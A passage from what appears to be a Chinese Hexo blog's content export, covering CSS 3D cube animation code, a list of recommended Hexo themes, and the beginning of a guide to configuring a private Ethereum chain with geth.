class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.cara</span>:nth-child(<span class="number">1</span>) &#123;</span><br><span class="line">  -webkit-<span class="attribute">transform</span>: translateZ(<span class="number">50px</span>);</span><br><span class="line">  -moz-<span class="attribute">transform</span>: translateZ(<span class="number">50px</span>);</span><br><span class="line">  -o-<span class="attribute">transform</span>: translateZ(<span class="number">50px</span>);</span><br><span class="line">  -ms-<span class="attribute">transform</span>: translateZ(<span class="number">50px</span>);</span><br><span class="line">  <span class="attribute">transform</span>: translateZ(<span class="number">50px</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.cara</span>:nth-child(<span class="number">2</span>) &#123;</span><br><span class="line">  -webkit-<span class="attribute">transform</span>: rotateX(-<span class="number">90deg</span>) translateZ(<span class="number">50px</span>);</span><br><span class="line">  -moz-<span class="attribute">transform</span>: rotateX(-<span class="number">90deg</span>) translateZ(<span class="number">50px</span>);</span><br><span class="line">  -o-<span class="attribute">transform</span>: rotateX(-<span class="number">90deg</span>) translateZ(<span class="number">50px</span>);</span><br><span class="line">  -ms-<span class="attribute">transform</span>: rotateX(-<span class="number">90deg</span>) translateZ(<span class="number">50px</span>);</span><br><span class="line">  <span class="attribute">transform</span>: rotateX(-<span class="number">90deg</span>) translateZ(<span class="number">50px</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.cara</span>:nth-child(<span class="number">3</span>) &#123;</span><br><span class="line">  -webkit-<span class="attribute">transform</span>: rotateX(<span class="number">90deg</span>) rotateZ(-<span class="number">90deg</span>) translateZ(<span class="number">50px</span>);</span><br><span class="line">  -moz-<span class="attribute">transform</span>: rotateX(<span class="number">90deg</span>) rotateZ(-<span class="number">90deg</span>) translateZ(<span class="number">50px</span>);</span><br><span class="line">  -o-<span class="attribute">transform</span>: rotateX(<span class="number">90deg</span>) rotateZ(-<span class="number">90deg</span>) translateZ(<span class="number">50px</span>);</span><br><span class="line">  -ms-<span class="attribute">transform</span>: rotateX(<span class="number">90deg</span>) rotateZ(-<span class="number">90deg</span>) translateZ(<span class="number">50px</span>);</span><br><span class="line">  <span class="attribute">transform</span>: rotateX(<span class="number">90deg</span>) rotateZ(-<span class="number">90deg</span>) translateZ(<span class="number">50px</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.cara</span>:nth-child(<span class="number">4</span>) &#123;</span><br><span class="line">  -webkit-<span class="attribute">transform</span>: rotateY(-<span class="number">90deg</span>) translateZ(<span class="number">50px</span>);</span><br><span class="line">  -moz-<span class="attribute">transform</span>: rotateY(-<span class="number">90deg</span>) translateZ(<span class="number">50px</span>);</span><br><span class="line">  -o-<span class="attribute">transform</span>: rotateY(-<span class="number">90deg</span>) translateZ(<span class="number">50px</span>);</span><br><span class="line">  -ms-<span class="attribute">transform</span>: rotateY(-<span class="number">90deg</span>) translateZ(<span class="number">50px</span>);</span><br><span class="line">  <span class="attribute">transform</span>: rotateY(-<span class="number">90deg</span>) translateZ(<span class="number">50px</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.cara</span>:nth-child(<span class="number">5</span>) &#123;</span><br><span class="line">  -webkit-<span class="attribute">transform</span>: rotateY(<span class="number">90deg</span>) rotateZ(<span class="number">90deg</span>) translateZ(<span class="number">50px</span>);</span><br><span class="line">  -moz-<span class="attribute">transform</span>: rotateY(<span class="number">90deg</span>) rotateZ(<span class="number">90deg</span>) translateZ(<span class="number">50px</span>);</span><br><span class="line">  -o-<span class="attribute">transform</span>: rotateY(<span class="number">90deg</span>) rotateZ(<span class="number">90deg</span>) translateZ(<span class="number">50px</span>);</span><br><span class="line">  -ms-<span class="attribute">transform</span>: rotateY(<span class="number">90deg</span>) rotateZ(<span class="number">90deg</span>) translateZ(<span class="number">50px</span>);</span><br><span class="line">  <span class="attribute">transform</span>: rotateY(<span class="number">90deg</span>) rotateZ(<span class="number">90deg</span>) translateZ(<span class="number">50px</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.cara</span>:nth-child(<span class="number">6</span>) &#123;</span><br><span class="line">  -webkit-<span class="attribute">transform</span>: rotateY(<span class="number">180deg</span>) translateZ(<span class="number">50px</span>);</span><br><span class="line">  -moz-<span class="attribute">transform</span>: rotateY(<span class="number">180deg</span>) translateZ(<span class="number">50px</span>);</span><br><span class="line">  -o-<span class="attribute">transform</span>: rotateY(<span class="number">180deg</span>) translateZ(<span class="number">50px</span>);</span><br><span class="line">  -ms-<span class="attribute">transform</span>: rotateY(<span class="number">180deg</span>) translateZ(<span class="number">50px</span>);</span><br><span class="line">  <span class="attribute">transform</span>: rotateY(<span class="number">180deg</span>) translateZ(<span class="number">50px</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.animar</span> &#123;</span><br><span class="line">  -webkit-<span class="attribute">transition</span>: all <span class="number">1s</span>;</span><br><span class="line">  -moz-<span class="attribute">transition</span>: all <span class="number">1s</span>;</span><br><span class="line">  -o-<span class="attribute">transition</span>: all <span class="number">1s</span>;</span><br><span class="line">  -ms-<span class="attribute">transition</span>: all <span class="number">1s</span>;</span><br><span class="line">  <span class="attribute">transition</span>: all <span class="number">1s</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.noanimar</span> &#123;</span><br><span class="line">  -webkit-<span class="attribute">transition</span>: none;</span><br><span class="line">  -moz-<span class="attribute">transition</span>: none;</span><br><span class="line">  -o-<span class="attribute">transition</span>: none;</span><br><span class="line">  -ms-<span class="attribute">transition</span>: none;</span><br><span class="line">  <span class="attribute">transition</span>: none;</span><br><span class="line">&#125;</span><br><span class="line">@-moz-keyframes spincube &#123;</span><br><span class="line">  <span class="number">16%</span> &#123;</span><br><span class="line">    -webkit-<span class="attribute">transform</span>: rotateX(<span class="number">90deg</span>);</span><br><span class="line">    -moz-<span class="attribute">transform</span>: rotateX(<span class="number">90deg</span>);</span><br><span class="line">    -o-<span class="attribute">transform</span>: rotateX(<span class="number">90deg</span>);</span><br><span class="line">    -ms-<span class="attribute">transform</span>: rotateX(<span class="number">90deg</span>);</span><br><span class="line">    <span class="attribute">transform</span>: rotateX(<span class="number">90deg</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">33%</span> &#123;</span><br><span class="line">    -webkit-<span class="attribute">transform</span>: rotateY(-<span class="number">90deg</span>) rotateZ(<span class="number">90deg</span>);</span><br><span class="line">    -moz-<span class="attribute">transform</span>: rotateY(-<span class="number">90deg</span>) rotateZ(<span class="number">90deg</span>);</span><br><span class="line">    -o-<span class="attribute">transform</span>: rotateY(-<span class="number">90deg</span>) rotateZ(<span class="number">90deg</span>);</span><br><span class="line">    -ms-<span class="attribute">transform</span>: rotateY(-<span class="number">90deg</span>) rotateZ(<span class="number">90deg</span>);</span><br><span class="line">    <span class="attribute">transform</span>: rotateY(-<span class="number">90deg</span>) rotateZ(<span class="number">90deg</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">50%</span> &#123;</span><br><span class="line">    -webkit-<span class="attribute">transform</span>: rotateY(<span class="number">90deg</span>);</span><br><span class="line">    -moz-<span class="attribute">transform</span>: rotateY(<span class="number">90deg</span>);</span><br><span class="line">    -o-<span class="attribute">transform</span>: rotateY(<span class="number">90deg</span>);</span><br><span class="line">    -ms-<span class="attribute">transform</span>: rotateY(<span class="number">90deg</span>);</span><br><span class="line">    <span class="attribute">transform</span>: rotateY(<span class="number">90deg</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">66%</span> &#123;</span><br><span class="line">    -webkit-<span class="attribute">transform</span>: rotateX(-<span class="number">90deg</span>) rotateZ(-<span class="number">90deg</span>);</span><br><span class="line">    -moz-<span class="attribute">transform</span>: rotateX(-<span class="number">90deg</span>) rotateZ(-<span class="number">90deg</span>);</span><br><span class="line">    -o-<span class="attribute">transform</span>: rotateX(-<span class="number">90deg</span>) rotateZ(-<span class="number">90deg</span>);</span><br><span class="line">    -ms-<span class="attribute">transform</span>: rotateX(-<span class="number">90deg</span>) rotateZ(-<span class="number">90deg</span>);</span><br><span class="line">    <span class="attribute">transform</span>: rotateX(-<span class="number">90deg</span>) rotateZ(-<span class="number">90deg</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">83%</span> &#123;</span><br><span class="line">    -webkit-<span class="attribute">transform</span>: rotateY(<span class="number">180deg</span>);</span><br><span class="line">    -moz-<span class="attribute">transform</span>: rotateY(<span class="number">180deg</span>);</span><br><span class="line">    -o-<span class="attribute">transform</span>: rotateY(<span class="number">180deg</span>);</span><br><span class="line">    -ms-<span class="attribute">transform</span>: rotateY(<span class="number">180deg</span>);</span><br><span class="line">    <span class="attribute">transform</span>: rotateY(<span class="number">180deg</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">@-webkit-keyframes spincube &#123;</span><br><span class="line">  <span class="number">16%</span> &#123;</span><br><span class="line">    -webkit-<span class="attribute">transform</span>: rotateX(<span class="number">90deg</span>);</span><br><span class="line">    -moz-<span class="attribute">transform</span>: rotateX(<span class="number">90deg</span>);</span><br><span class="line">    -o-<span class="attribute">transform</span>: rotateX(<span class="number">90deg</span>);</span><br><span class="line">    -ms-<span class="attribute">transform</span>: rotateX(<span class="number">90deg</span>);</span><br><span class="line">    <span class="attribute">transform</span>: rotateX(<span class="number">90deg</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">33%</span> &#123;</span><br><span class="line">    -webkit-<span class="attribute">transform</span>: rotateY(-<span class="number">90deg</span>) rotateZ(<span class="number">90deg</span>);</span><br><span class="line">    -moz-<span class="attribute">transform</span>: rotateY(-<span class="number">90deg</span>) rotateZ(<span class="number">90deg</span>);</span><br><span class="line">    -o-<span class="attribute">transform</span>: rotateY(-<span class="number">90deg</span>) rotateZ(<span class="number">90deg</span>);</span><br><span class="line">    -ms-<span class="attribute">transform</span>: rotateY(-<span class="number">90deg</span>) rotateZ(<span class="number">90deg</span>);</span><br><span class="line">    <span class="attribute">transform</span>: rotateY(-<span class="number">90deg</span>) rotateZ(<span class="number">90deg</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">50%</span> &#123;</span><br><span class="line">    -webkit-<span class="attribute">transform</span>: rotateY(<span class="number">90deg</span>);</span><br><span class="line">    -moz-<span class="attribute">transform</span>: rotateY(<span class="number">90deg</span>);</span><br><span class="line">    -o-<span class="attribute">transform</span>: rotateY(<span class="number">90deg</span>);</span><br><span class="line">    -ms-<span class="attribute">transform</span>: rotateY(<span class="number">90deg</span>);</span><br><span class="line">    <span class="attribute">transform</span>: rotateY(<span class="number">90deg</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">66%</span> &#123;</span><br><span class="line">    -webkit-<span class="attribute">transform</span>: rotateX(-<span class="number">90deg</span>) rotateZ(-<span class="number">90deg</span>);</span><br><span class="line">    -moz-<span class="attribute">transform</span>: rotateX(-<span class="number">90deg</span>) rotateZ(-<span class="number">90deg</span>);</span><br><span class="line">    -o-<span class="attribute">transform</span>: rotateX(-<span class="number">90deg</span>) rotateZ(-<span class="number">90deg</span>);</span><br><span class="line">    -ms-<span class="attribute">transform</span>: rotateX(-<span class="number">90deg</span>) rotateZ(-<span class="number">90deg</span>);</span><br><span class="line">    <span class="attribute">transform</span>: rotateX(-<span class="number">90deg</span>) rotateZ(-<span class="number">90deg</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">83%</span> &#123;</span><br><span class="line">    -webkit-<span class="attribute">transform</span>: rotateY(<span class="number">180deg</span>);</span><br><span class="line">    -moz-<span class="attribute">transform</span>: rotateY(<span class="number">180deg</span>);</span><br><span class="line">    -o-<span class="attribute">transform</span>: rotateY(<span class="number">180deg</span>);</span><br><span class="line">    -ms-<span class="attribute">transform</span>: rotateY(<span class="number">180deg</span>);</span><br><span class="line">    <span class="attribute">transform</span>: rotateY(<span class="number">180deg</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">@-o-keyframes spincube &#123;</span><br><span class="line">  <span class="number">16%</span> &#123;</span><br><span class="line">    -webkit-<span class="attribute">transform</span>: rotateX(<span class="number">90deg</span>);</span><br><span class="line">    -moz-<span class="attribute">transform</span>: rotateX(<span class="number">90deg</span>);</span><br><span class="line">    -o-<span class="attribute">transform</span>: rotateX(<span class="number">90deg</span>);</span><br><span class="line">    -ms-<span class="attribute">transform</span>: rotateX(<span class="number">90deg</span>);</span><br><span class="line">    <span class="attribute">transform</span>: rotateX(<span class="number">90deg</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">33%</span> &#123;</span><br><span class="line">    -webkit-<span class="attribute">transform</span>: rotateY(-<span class="number">90deg</span>) rotateZ(<span class="number">90deg</span>);</span><br><span class="line">    -moz-<span class="attribute">transform</span>: rotateY(-<span class="number">90deg</span>) rotateZ(<span class="number">90deg</span>);</span><br><span class="line">    -o-<span class="attribute">transform</span>: rotateY(-<span class="number">90deg</span>) rotateZ(<span class="number">90deg</span>);</span><br><span class="line">    -ms-<span class="attribute">transform</span>: rotateY(-<span class="number">90deg</span>) rotateZ(<span class="number">90deg</span>);</span><br><span class="line">    <span class="attribute">transform</span>: rotateY(-<span class="number">90deg</span>) rotateZ(<span class="number">90deg</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">50%</span> &#123;</span><br><span class="line">    -webkit-<span class="attribute">transform</span>: rotateY(<span class="number">90deg</span>);</span><br><span class="line">    -moz-<span class="attribute">transform</span>: rotateY(<span class="number">90deg</span>);</span><br><span class="line">    -o-<span class="attribute">transform</span>: rotateY(<span class="number">90deg</span>);</span><br><span class="line">    -ms-<span class="attribute">transform</span>: rotateY(<span class="number">90deg</span>);</span><br><span class="line">    <span class="attribute">transform</span>: rotateY(<span class="number">90deg</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">66%</span> &#123;</span><br><span class="line">    -webkit-<span class="attribute">transform</span>: rotateX(-<span class="number">90deg</span>) rotateZ(-<span class="number">90deg</span>);</span><br><span class="line">    -moz-<span class="attribute">transform</span>: rotateX(-<span class="number">90deg</span>) rotateZ(-<span class="number">90deg</span>);</span><br><span class="line">    -o-<span class="attribute">transform</span>: rotateX(-<span class="number">90deg</span>) rotateZ(-<span class="number">90deg</span>);</span><br><span class="line">    -ms-<span class="attribute">transform</span>: rotateX(-<span class="number">90deg</span>) rotateZ(-<span class="number">90deg</span>);</span><br><span class="line">    <span class="attribute">transform</span>: rotateX(-<span class="number">90deg</span>) rotateZ(-<span class="number">90deg</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">83%</span> &#123;</span><br><span class="line">    -webkit-<span class="attribute">transform</span>: rotateY(<span class="number">180deg</span>);</span><br><span class="line">    -moz-<span class="attribute">transform</span>: rotateY(<span class="number">180deg</span>);</span><br><span class="line">    -o-<span class="attribute">transform</span>: rotateY(<span class="number">180deg</span>);</span><br><span class="line">    -ms-<span class="attribute">transform</span>: rotateY(<span class="number">180deg</span>);</span><br><span class="line">    <span class="attribute">transform</span>: rotateY(<span class="number">180deg</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">@keyframes spincube &#123;</span><br><span class="line">  <span class="number">16%</span> &#123;</span><br><span class="line">    -webkit-<span class="attribute">transform</span>: rotateX(<span class="number">90deg</span>);</span><br><span class="line">    -moz-<span class="attribute">transform</span>: rotateX(<span class="number">90deg</span>);</span><br><span class="line">    -o-<span class="attribute">transform</span>: rotateX(<span class="number">90deg</span>);</span><br><span class="line">    -ms-<span class="attribute">transform</span>: rotateX(<span class="number">90deg</span>);</span><br><span class="line">    <span class="attribute">transform</span>: rotateX(<span class="number">90deg</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">33%</span> &#123;</span><br><span class="line">    -webkit-<span class="attribute">transform</span>: rotateY(-<span class="number">90deg</span>) rotateZ(<span class="number">90deg</span>);</span><br><span class="line">    -moz-<span class="attribute">transform</span>: rotateY(-<span class="number">90deg</span>) rotateZ(<span class="number">90deg</span>);</span><br><span class="line">    -o-<span class="attribute">transform</span>: rotateY(-<span class="number">90deg</span>) rotateZ(<span class="number">90deg</span>);</span><br><span class="line">    -ms-<span class="attribute">transform</span>: rotateY(-<span class="number">90deg</span>) rotateZ(<span class="number">90deg</span>);</span><br><span class="line">    <span class="attribute">transform</span>: rotateY(-<span class="number">90deg</span>) rotateZ(<span class="number">90deg</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">50%</span> &#123;</span><br><span class="line">    -webkit-<span class="attribute">transform</span>: rotateY(<span class="number">90deg</span>);</span><br><span class="line">    -moz-<span class="attribute">transform</span>: rotateY(<span class="number">90deg</span>);</span><br><span class="line">    -o-<span class="attribute">transform</span>: rotateY(<span class="number">90deg</span>);</span><br><span class="line">    -ms-<span class="attribute">transform</span>: rotateY(<span class="number">90deg</span>);</span><br><span class="line">    <span class="attribute">transform</span>: rotateY(<span class="number">90deg</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">66%</span> &#123;</span><br><span class="line">    -webkit-<span class="attribute">transform</span>: rotateX(-<span class="number">90deg</span>) rotateZ(-<span class="number">90deg</span>);</span><br><span class="line">    -moz-<span class="attribute">transform</span>: rotateX(-<span class="number">90deg</span>) rotateZ(-<span class="number">90deg</span>);</span><br><span class="line">    -o-<span class="attribute">transform</span>: rotateX(-<span class="number">90deg</span>) rotateZ(-<span class="number">90deg</span>);</span><br><span class="line">    -ms-<span class="attribute">transform</span>: rotateX(-<span class="number">90deg</span>) rotateZ(-<span class="number">90deg</span>);</span><br><span class="line">    <span class="attribute">transform</span>: rotateX(-<span class="number">90deg</span>) rotateZ(-<span class="number">90deg</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="number">83%</span> &#123;</span><br><span class="line">    -webkit-<span class="attribute">transform</span>: rotateY(<span class="number">180deg</span>);</span><br><span class="line">    -moz-<span class="attribute">transform</span>: rotateY(<span class="number">180deg</span>);</span><br><span class="line">    -o-<span class="attribute">transform</span>: rotateY(<span class="number">180deg</span>);</span><br><span class="line">    -ms-<span class="attribute">transform</span>: rotateY(<span class="number">180deg</span>);</span><br><span class="line">    <span class="attribute">transform</span>: rotateY(<span class="number">180deg</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实还有很多大佬有过研究哒，我如果这个效果不行，我就会用他们的，感觉很好懂：</p><p><a href="http://luckykun.com/work/2016-07-23/css3-study02.html" target="_blank" rel="noopener">CSS3 3D立方体效果－transform也不过如此</a>，<a href="https://github.com/luckykun/About-CSS3/blob/master/3dRect.html" target="_blank" rel="noopener">github源码</a>，<a href="http://luckykun.com/work/2016-07-24/rect-grid-demo.html" target="_blank" rel="noopener">实例demo之3D transform立方体效果</a></p><p><a href="https://www.the-art-of-web.com/css/3d-transforms/" target="_blank" rel="noopener">CSS: 3D Transforms and Animations</a>，<a href="https://www.the-art-of-web.com/css/rotating-cube/" target="_blank" rel="noopener">效果图</a></p><!-- rebuild by neat -->]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo主题推荐</title>
      <link href="/2019/09/05/hexo_themes/"/>
      <url>/2019/09/05/hexo_themes/</url>
      
        <content type="html"><![CDATA[<!-- build time:Mon Apr 20 2020 11:02:23 GMT+0800 (中国标准时间) --><p>推荐一些好看的主题</p><a id="more"></a><h1 id="Maupassant"><a href="#Maupassant" class="headerlink" title="Maupassant"></a>Maupassant</h1><p><a href="https://www.haomwei.com/technology/maupassant-hexo.html" target="_blank" rel="noopener">https://www.haomwei.com/technology/maupassant-hexo.html</a></p><p><img src="https://i.loli.net/2019/09/23/b6x53oCljdEFSeV.jpg" alt="img"></p><p>特征点</p><p><img src="https://i.loli.net/2019/09/23/XyprRWFUiTcY2BA.png" alt="image-20190905152949695"></p><h1 id="NextT"><a href="#NextT" class="headerlink" title="NextT"></a>NextT</h1><p>这个超火的，这是其中一款，还有好多；定制化和说明书写得比较好</p><p><a href="https://github.com/theme-next/hexo-theme-next" target="_blank" rel="noopener">https://github.com/theme-next/hexo-theme-next</a></p><p><img src="https://i.loli.net/2019/09/23/8mcaDs6Ik54UFdo.png" alt="img"></p><p>特点，标签这些都可以配置；这是最原始的nextT主题，所以没有配置</p><p><img src="https://i.loli.net/2019/09/23/HYb65DL789EzQay.png" alt="image-20190905153653315"></p><h1 id="cube"><a href="#cube" class="headerlink" title="cube"></a>cube</h1><p>功能花哨；推</p><p><a href="https://github.com/ZEROKISEKI/hexo-theme-cube" target="_blank" rel="noopener">https://github.com/ZEROKISEKI/hexo-theme-cube</a></p><p><img src="https://i.loli.net/2019/09/23/uygFqz42EX5nraJ.png" alt="image-20190905153928666"></p><p>特点：</p><p><img src="https://i.loli.net/2019/09/23/FSbmO5zHEfiehCg.png" alt="image-20190905154201041"></p><h1 id="archer"><a href="#archer" class="headerlink" title="archer"></a>archer</h1><p>感觉这个风格挺多人用的</p><p><a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank" rel="noopener">https://github.com/fi3ework/hexo-theme-archer</a></p><p><img src="https://i.loli.net/2019/09/23/FpoxjJXceHqT468.png" alt="img"></p><p>有回到顶部按钮和</p><img src="https://i.loli.net/2019/09/23/lxoNAutEQGWOSVX.png" alt="image-20190905154459882" style="zoom:50%"><h1 id="beantech"><a href="#beantech" class="headerlink" title="beantech"></a>beantech</h1><p>MDZZ，装不上，应该是最心水的一款了，不过原版感觉最好看！可惜不是hexo的</p><p><a href="https://github.com/YenYuHsuan/hexo-theme-beantech" target="_blank" rel="noopener">https://github.com/YenYuHsuan/hexo-theme-beantech</a></p><p><img src="https://i.loli.net/2019/09/23/IpnE4ROFL8u5J1o.png" alt="img"></p><p>其原版来自：<a href="https://github.com/Huxpro/huxpro.github.io" target="_blank" rel="noopener">https://github.com/Huxpro/huxpro.github.io</a></p><p><img src="https://i.loli.net/2019/09/23/ncVzsujbwWGP214.png" alt="image-20190905161711578"></p><h1 id="paperbox"><a href="#paperbox" class="headerlink" title="paperbox"></a>paperbox</h1><p>把皮肤换了之后就是最喜欢的，官宣图的背景图好漂亮；我也找到原图了；</p><p><a href="https://github.com/sun11/hexo-theme-paperbox" target="_blank" rel="noopener">https://github.com/sun11/hexo-theme-paperbox</a></p><p><img src="https://i.loli.net/2019/09/29/DOBlFhd6ctPyC3I.png" alt="image-20190905161802980"></p><p>绿色太丑了，官方的比较好看</p><p><img src="https://i.loli.net/2019/09/23/BEmIlNkwyv534Wq.png" alt="官方图片"></p><p>这款优点：归档特别好看，来源于 <a href="https://github.com/xiangming/landscape-plus" target="_blank" rel="noopener">Landscape-plus</a> theme，而且标签也不错；但是没有太多指导，排版有点乱；</p><p><img src="https://i.loli.net/2019/09/23/L1eK5cJGF49H2pf.png" alt="image-20190905161930089"></p><h1 id="Luuman’s-Blog"><a href="#Luuman’s-Blog" class="headerlink" title="Luuman’s Blog"></a><a href="https://blog.luuman.club/" target="_blank" rel="noopener">Luuman’s Blog</a></h1><p>加黑，哈哈哈</p><p><a href="https://blog.luuman.club/" target="_blank" rel="noopener">https://blog.luuman.club/</a></p><p><img src="https://i.loli.net/2019/09/23/qAezbciMmgPlGaB.png" alt="image-20190905154956752"></p><!-- rebuild by neat -->]]></content>
      
      
      <categories>
          
          <category> 分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>以太坊私链搭建与配置</title>
      <link href="/2019/06/12/geth-privatechain/"/>
      <url>/2019/06/12/geth-privatechain/</url>
      
        <content type="html"><![CDATA[<!-- build time:Mon Apr 20 2020 11:02:23 GMT+0800 (中国标准时间) --><p>个人记录，很多操作参考了这篇文章与其他的，主要是为了给自己一条特别适合自己工作环境的私链。</p><a id="more"></a><h2 id="关于环境"><a href="#关于环境" class="headerlink" title="关于环境"></a>关于环境</h2><p>用的geth，安装啥的我觉得不用多说了，资料太多</p><h2 id="init"><a href="#init" class="headerlink" title="init"></a>init</h2><h3 id="创世区块"><a href="#创世区块" class="headerlink" title="创世区块"></a>创世区块</h3><p>在非go目录下，新建一个，比如我在<code>~/PersonWork/bychain</code>，目录下来一个gensis.json，创世区块！</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">"config"</span>: &#123;</span><br><span class="line">    <span class="string">"chainId"</span>: <span class="number">23333</span>, <span class="comment">//反正别是1，1是以太坊主链</span></span><br><span class="line">    <span class="string">"homesteadBlock"</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">"eip150Block"</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">"eip155Block"</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">"eip158Block"</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">"byzantiumBlock"</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">"constantinopleBlock"</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">"petersburgBlock"</span>: <span class="number">0</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">"alloc"</span>: &#123;&#125;, <span class="comment">//可以初始化账户，但是觉得没必要</span></span><br><span class="line">  <span class="string">"coinbase"</span>: <span class="string">"0x0000000000000000000000000000000000000000"</span>, <span class="comment">//默认收钱账户，就是默认矿工账户</span></span><br><span class="line">  <span class="string">"difficulty"</span>: <span class="string">"0x400"</span>, <span class="comment">//区块挖掘难度</span></span><br><span class="line">  <span class="string">"extraData"</span>: <span class="string">"0x"</span>, <span class="comment">//不能是0x0，会报错，就是0x，不是我写错了</span></span><br><span class="line">  <span class="string">"gasLimit"</span>: <span class="string">"0x2fefd8"</span>, <span class="comment">//gas limit</span></span><br><span class="line">  <span class="string">"nonce"</span>: <span class="string">"0xdeadbeefdeadbeaf"</span>,</span><br><span class="line">  <span class="string">"mixhash"</span>: <span 